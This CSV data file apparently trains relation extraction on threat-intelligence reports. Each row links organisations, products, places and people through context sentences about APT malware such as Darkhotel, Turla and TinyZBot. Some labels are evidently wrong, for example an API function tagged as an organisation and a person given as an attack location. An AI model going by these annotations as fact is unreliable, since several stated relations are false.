"FileName","RelationType","Entity1Mention","Entity1Type","Entity2Mention","Entity2Type","Context"
"unveilingthemask_v1.0","hasproduct","Microsoft","ORG","Windows","PRODUCT","Installation is also Microsoft Windows version - aware . "
"unveilingthemask_v1.0","hasproduct","Mozilla","ORG","Firefox","PRODUCT","The Mozilla Firefox plugin which installs the Linux “ SBD ” backdoor : "
"darkhotelappendixindicators_kl_1.1","hasproduct","Mozilla","ORG","Firefox","PRODUCT","In addition it makes use of the following Mozilla Firefox libraries depending on Firefox version : • nss3.dll • plc4.dll • mozcrt19.dll "
"Dragonfly_Threat_Against_Western_Energy_Suppliers","indicates","Outlook","PRODUCT","two","CARDINAL","The two samples look for the ICS related software file and Outlook ’s autocomplete address book file ( outlook.nk2 ) . "
"darkhotel_kl_07.11","hasproduct","Microsoft","ORG","Windows","PRODUCT","While this is not a vulnerability in a Microsoft product , this issue affects all supported releases of Microsoft Windows . "
"Turla_2_Penquin","hasproduct","Microsoft","ORG","Windows","PRODUCT","So far , every single Turla sample we 've encountered was designed for the Microsoft Windows family , 32 and 64 bit operating systems . "
"unveilingthemask_v1.0","hasproduct","Microsoft","ORG","Outlook","PRODUCT","xxi ) awview32 module This module is injected in Microsoft Outlook processes . "
"ZoxPNG_Full_Analysis-Final","hasproduct","ObtainUserAgentString","ORG","API","PRODUCT","After opening a HTTP request to the URL , the ZoxPNG will add a User - Agent header based on the user - agent string returned by a call to the ObtainUserAgentString API function . "
"XSLCmd_OSX","hasattacklocation","“IceFog","ORG","South Korea","GPE","In 2013 , Kaspersky reported on a threat actor group they named “ IceFog ” that had been attacking a large number of entities related to military , mass media , and technology in South Korea and Japan . "
"group-3279-targets-the-video-game-industry","hasattacklocation","Nikita Tarajanov","PERSON","China","GPE","Twitter accounts such as FireEye and SecurityTube , many penetration testers , and offensive - security Twitter accounts such as Nikita Tarajanov from Russia and a self - described "" Botmaster , TrueCrober , CreditCardFucker , Fraudmaster "" based in "" cardaland "" who posts in Russian . Based upon the geolocation data associated with Weibo posts , the Sincoder ( 2bcoder ) threat actor appears to live near Kefa Road in the Nanshan District of the Guangdong Province in Shenzhen , China as of this publication , and may be af.liated with the Wuhan University of Technology . "
"Cylance_Operation_Cleaver_Report","hasattacklocation","TinyZBot","ORG","Kuwait","GPE","The third is a new Binder_1 instance , which contains one of the TinyZBot instances compiled that day . The legitimate application included in this binder is called Easy_resume_creator and is a legitimate application named EasyRésuméCreatorPro . This version targeted a major Saudi Arabian oil company . From August 23 to August 26 , 2014 , new versions of TinyZBot were compiled with the AppUsageIds targeting major oil and gas companies in Qatar and Kuwait , Ministries of Foreign Affairs in the Persian Gulf , and a major airline holding company in UAE . "
